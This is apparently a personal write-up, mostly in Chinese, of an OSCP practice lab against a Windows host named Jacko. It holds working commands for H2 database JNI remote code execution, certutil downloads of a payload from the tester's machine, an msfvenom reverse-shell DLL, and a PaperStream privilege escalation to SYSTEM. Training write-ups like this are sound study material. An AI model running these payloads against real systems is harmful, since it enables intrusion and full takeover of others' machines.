## Nmap

```json
┌──(ouyang㉿kali)-[~/offensive-security/OSCP/Jacko]
└─$ sudo nmap -A -sV -sS -T4 192.168.199.66
[sudo] ouyang 的密碼：
Starting Nmap 7.92 ( https://nmap.org ) at 2023-08-25 22:28 CST
Nmap scan report for 192.168.199.66
Host is up (0.26s latency).
Not shown: 995 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-title: H2 Database Engine (redirect)
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
8082/tcp open  http          H2 database http console
|_http-title: H2 Console
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=8/25%OT=80%CT=1%CU=42867%PV=Y%DS=4%DC=T%G=Y%TM=64E8BAD
OS:A%P=aarch64-unknown-linux-gnu)SEQ(SP=FB%GCD=1%ISR=10F%TI=I%TS=U)OPS(O1=M
OS:54ENW8NNS%O2=M54ENW8NNS%O3=M54ENW8%O4=M54ENW8NNS%O5=M54ENW8NNS%O6=M54ENN
OS:S)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)ECN(R=Y%DF=Y%T=80%
OS:W=FFFF%O=M54ENW8NNS%CC=N%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2(R=
OS:N)T3(R=N)T4(R=N)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=N)T7(
OS:R=N)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=7257%RUD=G)I
OS:E(R=N)

Network Distance: 4 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2023-08-25T14:29:38
|_  start_date: N/A

TRACEROUTE (using port 8080/tcp)
HOP RTT       ADDRESS
1   305.13 ms 192.168.45.1
2   305.08 ms 192.168.45.254
3   305.15 ms 192.168.251.1
4   305.23 ms 192.168.199.66

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 75.64 seconds
```

用 sa/ \[無密碼\] 可成功登入並看到其版本為 1.4.199，且可以執行些 SQL command

![[截圖 2023-08-25 下午10.54.54.png]]

	重連 VPN，IP 換成 192.168.218.66

49384 似乎可利用

```json
┌──(ouyang㉿kali)-[~/offensive-security/OSCP/Jacko]
└─$ searchsploit "H2 Database"
------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                             |  Path
------------------------------------------------------------------------------------------- ---------------------------------
H2 Database - 'Alias' Arbitrary Code Execution                                             | java/local/44422.py
H2 Database 1.4.196 - Remote Code Execution                                                | java/webapps/45506.py
H2 Database 1.4.197 - Information Disclosure                                               | linux/webapps/45105.py
H2 Database 1.4.199 - JNI Code Execution                                                   | java/local/49384.txt
Oracle Database 10 g - XML DB xdb.xdb_pitrig_pkg Package PITRIG_TRUNCATE Function Overflow | multiple/remote/31010.sql
------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```

按照 [codewhitesec](https://codewhitesec.blogspot.com/2019/08/exploit-h2-database-native-libraries-jni.html) 說明 & 49384 資料，成功 RCE!

![[截圖 2023-08-26 下午10.36.02.png]]

透過 whoami / systeminfo 發現有個 user 叫 tony

接著嘗試其他指令，
(注意有些指令直接下 dir 會失敗，要透過 cmd /c 來執行)

```sql
CREATE ALIAS IF NOT EXISTS JNIScriptEngine_eval FOR "JNIScriptEngine.eval";
CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("cmd /c dir").getInputStream()).useDelimiter("\\Z").next()');
```

![[截圖 2023-08-26 下午10.45.06.png]]

```sql
CREATE ALIAS IF NOT EXISTS JNIScriptEngine_eval FOR "JNIScriptEngine.eval";
CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("certutil -urlcache -f http://192.168.45.215/shell.exe C:\\users\\tony\\desktop\\shell.exe").getInputStream()).useDelimiter("\\Z").next()');
```

成功上傳！

```sql
CREATE ALIAS IF NOT EXISTS JNIScriptEngine_eval FOR "JNIScriptEngine.eval";
CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("cmd /c C:\\users\\tony\\Desktop\\shell.exe").getInputStream()).useDelimiter("\\Z").next()');
```

成功彈回 reverse shell！
**發現有蠻多指令在 desktop 無法執行，改到 C:\\windows\\system32 執行**

```json
C:\Windows\System32>systeminfo
systeminfo

Host Name:                 JACKO
OS Name:                   Microsoft Windows 10 Pro
OS Version:                10.0.18363 N/A Build 18363
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Workstation
OS Build Type:             Multiprocessor Free
Registered Owner:          tony
Registered Organization:
Product ID:                00331-10000-00001-AA058
Original Install Date:     4/22/2020, 4:11:40 AM
System Boot Time:          8/4/2023, 7:04:09 AM
System Manufacturer:       VMware, Inc.
System Model:              VMware7,1
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: AMD64 Family 25 Model 1 Stepping 1 AuthenticAMD ~2650 Mhz
BIOS Version:              VMware, Inc. VMW71.00V.21100432.B64.2301110304, 1/11/2023
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume2
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC-08:00) Pacific Time (US & Canada)
Total Physical Memory:     2,047 MB
Available Physical Memory: 1,075 MB
Virtual Memory: Max Size:  2,687 MB
Virtual Memory: Available: 1,781 MB
Virtual Memory: In Use:    906 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    WORKGROUP
Logon Server:              N/A
Hotfix(s):                 9 Hotfix(s) Installed.
                           [01]: KB4552931
                           [02]: KB4497165
                           [03]: KB4513661
                           [04]: KB4516115
                           [05]: KB4517245
                           [06]: KB4521863
                           [07]: KB4537759
                           [08]: KB4552152
                           [09]: KB4556799
Network Card(s):           1 NIC(s) Installed.
                           [01]: vmxnet3 Ethernet Adapter
                                 Connection Name: Ethernet0
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 192.168.218.66
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.

C:\Windows\System32>whoami /all
whoami /all

USER INFORMATION
----------------

User Name  SID
========== ==============================================
jacko\tony S-1-5-21-3761179474-3535027177-3462755717-1001


GROUP INFORMATION
-----------------

Group Name                           Type             SID          Attributes
==================================== ================ ============ ==================================================
Everyone                             Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                        Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\SERVICE                 Well-known group S-1-5-6      Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                        Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users     Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization       Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account           Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
LOCAL                                Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication     Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level Label            S-1-16-12288


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State
============================= ========================================= ========
SeShutdownPrivilege           Shut down the system                      Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeUndockPrivilege             Remove computer from docking station      Disabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege       Create global objects                     Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
SeTimeZonePrivilege           Change the time zone                      Disabled
```

發現是 win10 且有 SeImpersonatePrivilege 權限，嘗試用 PrintSpoofer64 提權，但失敗

另外此台電腦環境變數有問題，用 command 設定 (也可加在原本的後面)

```json
set PATH=C:\Windows\System32
```

透過 winPEAS 沒發現什麼，改到 C:\\ 附近看有沒有可疑檔案或套件

在 Program files 底下發現有 PaperStream 可能可利用 (winPEAS 用 x64 版本，沒看到 x86 裡的 PaperStream)

```json
dir
 Volume in drive C has no label.
 Volume Serial Number is AC2F-6399

 Directory of C:\Program Files (x86)

04/27/2020  09:01 PM    <DIR>          .
04/27/2020  09:01 PM    <DIR>          ..
04/27/2020  08:59 PM    <DIR>          Common Files
04/27/2020  09:01 PM    <DIR>          fiScanner
04/27/2020  08:59 PM    <DIR>          H2
05/03/2022  06:22 PM    <DIR>          Internet Explorer
03/18/2019  09:52 PM    <DIR>          Microsoft.NET
04/27/2020  09:01 PM    <DIR>          PaperStream IP
03/18/2019  11:20 PM    <DIR>          Windows Defender
03/18/2019  09:52 PM    <DIR>          Windows Mail
04/24/2020  09:50 AM    <DIR>          Windows Media Player
03/18/2019  11:23 PM    <DIR>          Windows Multimedia Platform
03/18/2019  10:02 PM    <DIR>          Windows NT
03/18/2019  11:23 PM    <DIR>          Windows Photo Viewer
03/18/2019  11:23 PM    <DIR>          Windows Portable Devices
03/18/2019  09:52 PM    <DIR>          WindowsPowerShell
               0 File(s)              0 bytes
              16 Dir(s)   7,189,028,864 bytes free
```

從 readmeenu.rtf 檔案可以看到 PaperStream 版本為 1.42

```json
C:\Program Files (x86)\PaperStream IP\TWAIN>type readmeenu.rtf
type readmeenu.rtf
{\rtf1\ansi\ansicpg932\deff0\deflang1033\deflangfe1041{\fonttbl{\f0\fnil\fcharset0 Microsoft Sans Serif;}{\f1\fswiss\fprq2\fcharset0 Microsoft Sans Serif;}}
{\colortbl ;\red0\green0\blue0;}
{\*\generator Msftedit 5.41.21.2510;}\viewkind4\uc1\pard\nowidctlpar\sl276\slmult1\f0\fs18 ---------------------------------------------------------------------------------------------------------\par
fi Series\par
PaperStream IP driver 1.42\par
README file\par
```

透過 searchsploit 找到有個 49382 可利用

```json
┌──(ouyang㉿kali)-[~/offensive-security/OSCP/Jacko]
└─$ searchsploit paperstream
------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                             |  Path
------------------------------------------------------------------------------------------- ---------------------------------
PaperStream IP (TWAIN) 1.42.0.5685 - Local Privilege Escalation                            | windows/local/49382.ps1
------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```

照 ps1 中描述，先產一個 dll (記得產 x86 版本的)

```json
┌──(ouyang㉿kali)-[~/offensive-security/OSCP/Jacko]
└─$ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.189 LPORT=5555 -f dll -o UninOldIS.dll
/usr/share/metasploit-framework/vendor/bundle/ruby/3.0.0/gems/hrr_rb_ssh-0.4.2/lib/hrr_rb_ssh/transport/server_host_key_algorithm/ecdsa_sha2_nistp256.rb:11: warning: already initialized constant HrrRbSsh::Transport::ServerHostKeyAlgorithm::EcdsaSha2Nistp256::NAME
/usr/share/metasploit-framework/vendor/bundle/ruby/3.0.0/gems/hrr_rb_ssh-0.4.2/lib/hrr_rb_ssh/transport/server_host_key_algorithm/ecdsa_sha2_nistp256.rb:11: warning: previous definition of NAME was here
/usr/share/metasploit-framework/vendor/bundle/ruby/3.0.0/gems/hrr_rb_ssh-0.4.2/lib/hrr_rb_ssh/transport/server_host_key_algorithm/ecdsa_sha2_nistp256.rb:12: warning: already initialized constant HrrRbSsh::Transport::ServerHostKeyAlgorithm::EcdsaSha2Nistp256::PREFERENCE
/usr/share/metasploit-framework/vendor/bundle/ruby/3.0.0/gems/hrr_rb_ssh-0.4.2/lib/hrr_rb_ssh/transport/server_host_key_algorithm/ecdsa_sha2_nistp256.rb:12: warning: previous definition of PREFERENCE was here
/usr/share/metasploit-framework/vendor/bundle/ruby/3.0.0/gems/hrr_rb_ssh-0.4.2/lib/hrr_rb_ssh/transport/server_host_key_algorithm/ecdsa_sha2_nistp256.rb:13: warning: already initialized constant HrrRbSsh::Transport::ServerHostKeyAlgorithm::EcdsaSha2Nistp256::IDENTIFIER
/usr/share/metasploit-framework/vendor/bundle/ruby/3.0.0/gems/hrr_rb_ssh-0.4.2/lib/hrr_rb_ssh/transport/server_host_key_algorithm/ecdsa_sha2_nistp256.rb:13: warning: previous definition of IDENTIFIER was here
/usr/share/metasploit-framework/vendor/bundle/ruby/3.0.0/gems/hrr_rb_ssh-0.4.2/lib/hrr_rb_ssh/transport/server_host_key_algorithm/ecdsa_sha2_nistp256.rb:11: warning: already initialized constant HrrRbSsh::Transport::ServerHostKeyAlgorithm::EcdsaSha2Nistp256::NAME
/usr/share/metasploit-framework/vendor/bundle/ruby/3.0.0/gems/hrr_rb_ssh-0.4.2/lib/hrr_rb_ssh/transport/server_host_key_algorithm/ecdsa_sha2_nistp256.rb:11: warning: previous definition of NAME was here
/usr/share/metasploit-framework/vendor/bundle/ruby/3.0.0/gems/hrr_rb_ssh-0.4.2/lib/hrr_rb_ssh/transport/server_host_key_algorithm/ecdsa_sha2_nistp256.rb:12: warning: already initialized constant HrrRbSsh::Transport::ServerHostKeyAlgorithm::EcdsaSha2Nistp256::PREFERENCE
/usr/share/metasploit-framework/vendor/bundle/ruby/3.0.0/gems/hrr_rb_ssh-0.4.2/lib/hrr_rb_ssh/transport/server_host_key_algorithm/ecdsa_sha2_nistp256.rb:12: warning: previous definition of PREFERENCE was here
/usr/share/metasploit-framework/vendor/bundle/ruby/3.0.0/gems/hrr_rb_ssh-0.4.2/lib/hrr_rb_ssh/transport/server_host_key_algorithm/ecdsa_sha2_nistp256.rb:13: warning: already initialized constant HrrRbSsh::Transport::ServerHostKeyAlgorithm::EcdsaSha2Nistp256::IDENTIFIER
/usr/share/metasploit-framework/vendor/bundle/ruby/3.0.0/gems/hrr_rb_ssh-0.4.2/lib/hrr_rb_ssh/transport/server_host_key_algorithm/ecdsa_sha2_nistp256.rb:13: warning: previous definition of IDENTIFIER was here
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of dll file: 8704 bytes
Saved as: UninOldIS.dll
```

```json
C:\Users\tony\Desktop>certutil -urlcache -f http://192.168.45.189/UninOldIS.dll C:\Windows\Temp\UninOldIS.dll
certutil -urlcache -f http://192.168.45.189/UninOldIS.dll C:\Windows\Temp\UninOldIS.dll
****  Online  ****
CertUtil: -URLCache command completed successfully.
```

切成 powershell，並執行 ps1

```json
C:\Users\tony\Desktop>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Try the new cross-platform PowerShell https://aka.ms/pscore6

PS C:\Users\tony\Desktop>.\49382.ps1
```

成功提權！

kali:

```json
┌──(ouyang㉿kali)-[~/tools/windows/PrintSpoofer]
└─$ nc -nvlp 5555
listening on [any] 5555 ...
connect to [192.168.45.189] from (UNKNOWN) [192.168.212.66] 49803
Microsoft Windows [Version 10.0.18363.836]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```